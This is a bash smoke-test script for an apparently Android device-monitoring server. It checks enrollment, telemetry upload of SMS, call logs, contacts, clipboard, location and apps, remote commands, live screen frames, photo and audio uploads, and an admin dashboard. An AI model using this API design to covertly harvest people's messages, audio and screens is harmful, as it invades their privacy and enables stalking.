#!/usr/bin/env bash
# End-to-end smoke test for Server v2 over HTTPS.
# Requires a running server and a reachable MySQL. Loads .env if present.
set -uo pipefail

cd "$(dirname "$0")/.."
[ -f .env ] && set -a && . ./.env && set +a

BASE="${BASE_URL:-https://127.0.0.1:8443}"
ENROLL_KEY="${ENROLLMENT_KEY:-}"
ADMIN_EMAIL="${ADMIN_EMAIL:-admin@example.com}"
ADMIN_PASSWORD="${ADMIN_PASSWORD:-ChangeMe123!}"
TMP="$(mktemp -d)"
PASS=0
FAIL=0

CURL="curl -sk --max-time 20"

ok()   { PASS=$((PASS+1)); echo "  PASS: $1"; }
bad()  { FAIL=$((FAIL+1)); echo "  FAIL: $1"; }
check(){ if [ "$2" = "$3" ]; then ok "$1 ($2)"; else bad "$1 (expected [$3] got [$2])"; fi; }

# JSON field extractor using node (avoids jq dependency).
jget() { # jget <json> <dot.path> [default]
  node -e '
    let data="";process.stdin.on("data",d=>data+=d);process.stdin.on("end",()=>{
      let o;const path=(process.argv[1]||"").split(".");const def=process.argv[2];
      try{o=JSON.parse(data);}catch(e){process.stdout.write(def);return;}
      let cur=o;for(const p of path){if(cur==null){cur=def;break;}cur=cur[p];}
      if(cur===undefined||cur===null)cur=def;
      process.stdout.write(typeof cur==="object"?JSON.stringify(cur):String(cur));
    });' "$1" "${2:-}"
}

echo "== Server v2 smoke test =="
echo "BASE=$BASE"
echo

# --- 1. health --------------------------------------------------------------
echo "[1] health"
code=$($CURL -o "$TMP/health.json" -w '%{http_code}' -X POST "$BASE/api/v1/health")
check "health HTTP status" "$code" "200"
check "health status field" "$(jget < "$TMP/health.json" status)" "ok"
check "health version" "$(jget < "$TMP/health.json" version)" "2.0"
echo

# --- 2. enroll --------------------------------------------------------------
echo "[2] enroll"
DEVICE_UID="smoke-$(date +%s)-$RANDOM"
code=$($CURL -o "$TMP/enroll.json" -w '%{http_code}' -X POST "$BASE/api/v1/enroll" \
  -H 'Content-Type: application/json' \
  -d "{\"enrollment_key\":\"$ENROLL_KEY\",\"device_uid\":\"$DEVICE_UID\",\"label\":\"Smoke Device\",\"model\":\"Pixel\",\"manufacturer\":\"Google\",\"android_release\":\"14\",\"sdk_int\":34,\"app_version\":\"2.0\"}")
check "enroll HTTP status" "$code" "200"
DEVICE_ID=$(jget < "$TMP/enroll.json" device_id)
DEVICE_TOKEN=$(jget < "$TMP/enroll.json" device_token)
echo "  device_id=$DEVICE_ID token_len=${#DEVICE_TOKEN}"
if [ -n "$DEVICE_ID" ] && [ "${#DEVICE_TOKEN}" = "64" ]; then ok "enroll returned id + 64-hex token"; else bad "enroll id/token"; fi
# The cadence comes from .env (SYNC_INTERVAL_S), so assert against the same value
# the server was started with instead of a hardcoded default.
check "enroll sync_interval" "$(jget < "$TMP/enroll.json" sync_interval)" "${SYNC_INTERVAL_S:-60}"
check "enroll config.sms_interval_s" "$(jget < "$TMP/enroll.json" config.sms_interval_s)" "${SMS_INTERVAL_S:-60}"

echo "[2b] enroll wrong key -> 401"
code=$($CURL -o "$TMP/badkey.json" -w '%{http_code}' -X POST "$BASE/api/v1/enroll" \
  -H 'Content-Type: application/json' \
  -d "{\"enrollment_key\":\"WRONG\",\"device_uid\":\"$DEVICE_UID\"}")
check "wrong enrollment key HTTP status" "$code" "401"
check "wrong enrollment key error" "$(jget < "$TMP/badkey.json" error)" "invalid enrollment key"
echo

AUTH=(-H "Authorization: Bearer $DEVICE_TOKEN")

# --- 3. empty commands ------------------------------------------------------
echo "[3] GET /commands (should be empty)"
code=$($CURL -o "$TMP/cmds0.json" -w '%{http_code}' "$BASE/api/v1/commands?device_id=$DEVICE_UID" "${AUTH[@]}")
check "commands HTTP status" "$code" "200"
check "commands empty" "$(jget < "$TMP/cmds0.json" commands)" "[]"
check "commands config.collect_sms" "$(jget < "$TMP/cmds0.json" config.collect_sms)" "true"
check "commands config.sms_interval_s" "$(jget < "$TMP/cmds0.json" config.sms_interval_s)" "${SMS_INTERVAL_S:-60}"
echo

# --- 4. telemetry (all sections) -------------------------------------------
echo "[4] POST /telemetry (all sections)"
TELE_BODY=$(cat <<JSON
{"device_id":"$DEVICE_UID","app_version":"2.0","battery":95,
 "device_info":{"model":"Pixel","manufacturer":"Google","android_release":"14","sdk_int":34},
 "permissions":[{"name":"android.permission.CAMERA","granted":true},{"name":"android.permission.RECORD_AUDIO","granted":true}],
 "installed_apps":[{"package":"com.example.one","label":"App One","version_name":"1.0"}],
 "location":{"lat":12.34,"lon":56.78,"accuracy":5.0,"timestamp":1700000000000},
 "sms_logs":[{"sender":"+10000000001","body":"hello","timestamp":1700000000000,"direction":"in"}],
 "call_logs":[{"number":"+10000000001","name":"Mom","type":"incoming","duration_s":42,"timestamp":1700000000000}],
 "contacts":[{"display_name":"Mom","numbers":["+10000000001"],"emails":["mom@example.com"]}],
 "clipboard":[{"content":"clip-once","timestamp":1700000000000}],
 "usage_events":[{"type":"usage","package":"com.example.one","label":"App One","totalTimeMs":12345,"timestamp":1700000000000}]}
JSON
)
code=$($CURL -o "$TMP/tele1.json" -w '%{http_code}' -X POST "$BASE/api/v1/telemetry" \
  -H 'Content-Type: application/json' "${AUTH[@]}" -d "$TELE_BODY")
check "telemetry HTTP status" "$code" "200"
check "telemetry stored.sms" "$(jget < "$TMP/tele1.json" stored.sms)" "1"
check "telemetry stored.calls" "$(jget < "$TMP/tele1.json" stored.calls)" "1"
check "telemetry stored.contacts" "$(jget < "$TMP/tele1.json" stored.contacts)" "1"
check "telemetry stored.apps" "$(jget < "$TMP/tele1.json" stored.apps)" "1"
check "telemetry stored.location" "$(jget < "$TMP/tele1.json" stored.location)" "true"
echo

# --- 5. admin login ---------------------------------------------------------
echo "[5] admin login"
code=$($CURL -o "$TMP/login.json" -w '%{http_code}' -X POST "$BASE/auth/login" \
  -H 'Content-Type: application/json' \
  -d "{\"email\":\"$ADMIN_EMAIL\",\"password\":\"$ADMIN_PASSWORD\"}")
check "login HTTP status" "$code" "200"
JWT=$(jget < "$TMP/login.json" token)
if [ -n "$JWT" ]; then ok "login returned JWT"; else bad "login JWT missing"; fi
JWT_AUTH=(-H "Authorization: Bearer $JWT")

code=$($CURL -o "$TMP/me.json" -w '%{http_code}' "$BASE/auth/me" "${JWT_AUTH[@]}")
check "auth/me HTTP status" "$code" "200"

code=$($CURL -o /dev/null -w '%{http_code}' -X POST "$BASE/auth/login" -H 'Content-Type: application/json' -d '{"email":"nope@example.com","password":"x"}')
check "login bad creds HTTP status" "$code" "401"
echo

# --- 6. idempotency: counts before/after identical telemetry ----------------
echo "[6] telemetry idempotency"
code=$($CURL -o "$TMP/detail_before.json" -w '%{http_code}' "$BASE/devices/$DEVICE_ID" "${JWT_AUTH[@]}")
check "device detail HTTP status" "$code" "200"
SMS_BEFORE=$(jget < "$TMP/detail_before.json" sms_count)
CALL_BEFORE=$(jget < "$TMP/detail_before.json" call_count)
CONTACT_BEFORE=$(jget < "$TMP/detail_before.json" contact_count)
APP_BEFORE=$(jget < "$TMP/detail_before.json" app_count)
CLIP_BEFORE=$(jget < "$TMP/detail_before.json" clipboard_count)

code=$($CURL -o "$TMP/tele2.json" -w '%{http_code}' -X POST "$BASE/api/v1/telemetry" \
  -H 'Content-Type: application/json' "${AUTH[@]}" -d "$TELE_BODY")
check "telemetry re-post HTTP status" "$code" "200"

code=$($CURL -o "$TMP/detail_after.json" -w '%{http_code}' "$BASE/devices/$DEVICE_ID" "${JWT_AUTH[@]}")
SMS_AFTER=$(jget < "$TMP/detail_after.json" sms_count)
CALL_AFTER=$(jget < "$TMP/detail_after.json" call_count)
CONTACT_AFTER=$(jget < "$TMP/detail_after.json" contact_count)
APP_AFTER=$(jget < "$TMP/detail_after.json" app_count)
CLIP_AFTER=$(jget < "$TMP/detail_after.json" clipboard_count)
check "sms count unchanged" "$SMS_AFTER" "$SMS_BEFORE"
check "call count unchanged" "$CALL_AFTER" "$CALL_BEFORE"
check "contact count unchanged" "$CONTACT_AFTER" "$CONTACT_BEFORE"
check "app count unchanged" "$APP_AFTER" "$APP_BEFORE"
check "clipboard count unchanged (identical content skipped)" "$CLIP_AFTER" "$CLIP_BEFORE"
echo

# --- 7. command round trip --------------------------------------------------
echo "[7] command round trip"
code=$($CURL -o "$TMP/cc.json" -w '%{http_code}' -X POST "$BASE/devices/$DEVICE_ID/commands" \
  -H 'Content-Type: application/json' "${JWT_AUTH[@]}" \
  -d '{"action":"sync_now","params":{},"ttl_seconds":120}')
check "create command HTTP status" "$code" "200"
CMD_ID=$(jget < "$TMP/cc.json" id)
check "create command status" "$(jget < "$TMP/cc.json" status)" "pending"

code=$($CURL -o "$TMP/cmds1.json" -w '%{http_code}' "$BASE/api/v1/commands?device_id=$DEVICE_UID" "${AUTH[@]}")
check "device commands HTTP status" "$code" "200"
DELIVERED_ID=$(jget < "$TMP/cmds1.json" commands.0.id)
check "delivered command id" "$DELIVERED_ID" "$CMD_ID"
check "delivered action" "$(jget < "$TMP/cmds1.json" commands.0.action)" "sync_now"

code=$($CURL -o "$TMP/cr.json" -w '%{http_code}' -X POST "$BASE/api/v1/command_result" \
  -H 'Content-Type: application/json' "${AUTH[@]}" \
  -d "{\"id\":$CMD_ID,\"action\":\"sync_now\",\"status\":\"ok\",\"code\":0,\"message\":\"done\",\"device_id\":\"$DEVICE_UID\"}")
check "command_result HTTP status" "$code" "200"
check "command_result status" "$(jget < "$TMP/cr.json" status)" "ok"
echo

# --- 7b. per-device SMS cadence (set_sms_interval) --------------------------
# The SMS cadence must be independent of the poll cadence: set it to 30 s and
# confirm the device is told 30 while sync_interval keeps its .env value.
echo "[7b] set_sms_interval applies a per-device SMS cadence"
code=$($CURL -o "$TMP/sms_cc.json" -w '%{http_code}' -X POST "$BASE/devices/$DEVICE_ID/commands" \
  -H 'Content-Type: application/json' "${JWT_AUTH[@]}" \
  -d '{"action":"set_sms_interval","params":{"seconds":30},"ttl_seconds":120}')
check "set_sms_interval create HTTP status" "$code" "200"
check "set_sms_interval response value" "$(jget < "$TMP/sms_cc.json" sms_interval_s)" "30"
SMS_CMD_ID=$(jget < "$TMP/sms_cc.json" id)

code=$($CURL -o "$TMP/sms_conf.json" -w '%{http_code}' "$BASE/api/v1/config?device_id=$DEVICE_UID" "${AUTH[@]}")
check "device config HTTP status" "$code" "200"
check "device config.sms_interval_s" "$(jget < "$TMP/sms_conf.json" config.sms_interval_s)" "30"
check "device sync_interval unchanged" "$(jget < "$TMP/sms_conf.json" sync_interval)" "${SYNC_INTERVAL_S:-60}"

code=$($CURL -o "$TMP/sms_cmds.json" -w '%{http_code}' "$BASE/api/v1/commands?device_id=$DEVICE_UID" "${AUTH[@]}")
check "commands config.sms_interval_s" "$(jget < "$TMP/sms_cmds.json" config.sms_interval_s)" "30"

$CURL -o /dev/null -X POST "$BASE/api/v1/command_result" -H 'Content-Type: application/json' "${AUTH[@]}" \
  -d "{\"id\":$SMS_CMD_ID,\"action\":\"set_sms_interval\",\"status\":\"ok\",\"message\":\"applied\",\"device_id\":\"$DEVICE_UID\"}"

# restore the global default so re-runs of this suite start from the same state
code=$($CURL -o "$TMP/sms_reset.json" -w '%{http_code}' -X POST "$BASE/devices/$DEVICE_ID/commands" \
  -H 'Content-Type: application/json' "${JWT_AUTH[@]}" \
  -d "{\"action\":\"set_sms_interval\",\"params\":{\"seconds\":${SMS_INTERVAL_S:-60}},\"ttl_seconds\":120}")
check "set_sms_interval reset HTTP status" "$code" "200"
check "set_sms_interval reset value" "$(jget < "$TMP/sms_reset.json" sms_interval_s)" "${SMS_INTERVAL_S:-60}"
RESET_CMD_ID=$(jget < "$TMP/sms_reset.json" id)
$CURL -o /dev/null -X POST "$BASE/api/v1/command_result" -H 'Content-Type: application/json' "${AUTH[@]}" \
  -d "{\"id\":$RESET_CMD_ID,\"action\":\"set_sms_interval\",\"status\":\"ok\",\"message\":\"restored\",\"device_id\":\"$DEVICE_UID\"}"
echo

# --- 8. live frame ----------------------------------------------------------
echo "[8] live screen frame"
printf '/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/wAALCAABAAEBAREA/8QAFAABAAAAAAAAAAAAAAAAAAAACf/EABQQAQAAAAAAAAAAAAAAAAAAAAD/2gAIAQEAAD8AKp//2Q==' | base64 -d > "$TMP/1x1.jpg"
echo "  1x1.jpg bytes=$(stat -c %s "$TMP/1x1.jpg")"
code=$($CURL -o "$TMP/screen.json" -w '%{http_code}' -X POST "$BASE/api/v1/media/screen?device_id=$DEVICE_UID" \
  -H 'Content-Type: image/jpeg' "${AUTH[@]}" --data-binary @"$TMP/1x1.jpg")
check "media/screen HTTP status" "$code" "200"
check "media/screen status" "$(jget < "$TMP/screen.json" status)" "ok"
check "media/screen bytes" "$(jget < "$TMP/screen.json" bytes)" "$(stat -c %s "$TMP/1x1.jpg")"

FRAME_CT=$($CURL -o "$TMP/frame.jpg" -w '%{content_type}' "$BASE/media/frame/$DEVICE_ID" "${JWT_AUTH[@]}")
check "media/frame content-type" "$FRAME_CT" "image/jpeg"
echo

# --- 9. media photo + audio -------------------------------------------------
echo "[9] media upload (photo + audio)"
code=$($CURL -o "$TMP/photo.json" -w '%{http_code}' -X POST "$BASE/api/v1/media/photo?device_id=$DEVICE_UID" \
  -H 'Content-Type: image/jpeg' "${AUTH[@]}" --data-binary @"$TMP/1x1.jpg")
check "media/photo HTTP status" "$code" "200"
check "media/photo status" "$(jget < "$TMP/photo.json" status)" "ok"

# minimal valid WAV header (44 bytes)
printf 'RIFF\x24\x00\x00\x00WAVEfmt \x10\x00\x00\x00\x01\x00\x01\x00\x44\xac\x00\x00\x88\x58\x01\x00\x02\x00\x10\x00data\x00\x00\x00\x00' > "$TMP/tone.wav"
code=$($CURL -o "$TMP/audio.json" -w '%{http_code}' -X POST "$BASE/api/v1/media/audio?device_id=$DEVICE_UID&format=wav" \
  -H 'Content-Type: audio/wav' "${AUTH[@]}" --data-binary @"$TMP/tone.wav")
check "media/audio HTTP status" "$code" "200"
check "media/audio status" "$(jget < "$TMP/audio.json" status)" "ok"

code=$($CURL -o "$TMP/media.json" -w '%{http_code}' "$BASE/devices/$DEVICE_ID/data/media" "${JWT_AUTH[@]}")
check "media_files count >= 2" "$(node -e 'let d="";process.stdin.on("data",x=>d+=x);process.stdin.on("end",()=>{const j=JSON.parse(d);process.stdout.write(j.items.length>=2?"yes":"no")})' < "$TMP/media.json")" "yes"
echo

# --- 10. devices list shows online -----------------------------------------
echo "[10] GET /devices online"
code=$($CURL -o "$TMP/devices.json" -w '%{http_code}' "$BASE/devices" "${JWT_AUTH[@]}")
check "devices HTTP status" "$code" "200"
ONLINE=$(node -e '
  let d="";process.stdin.on("data",x=>d+=x);process.stdin.on("end",()=>{
    const j=JSON.parse(d);const id=parseInt(process.argv[1],10);
    const dev=j.devices.find(x=>x.id===id);process.stdout.write(dev?String(dev.is_online):"missing");
  });' "$DEVICE_ID" < "$TMP/devices.json")
check "enrolled device is_online" "$ONLINE" "true"
echo

echo "== summary: $PASS passed, $FAIL failed =="
echo "artifacts in $TMP"
if [ "$FAIL" -gt 0 ]; then exit 1; fi
exit 0
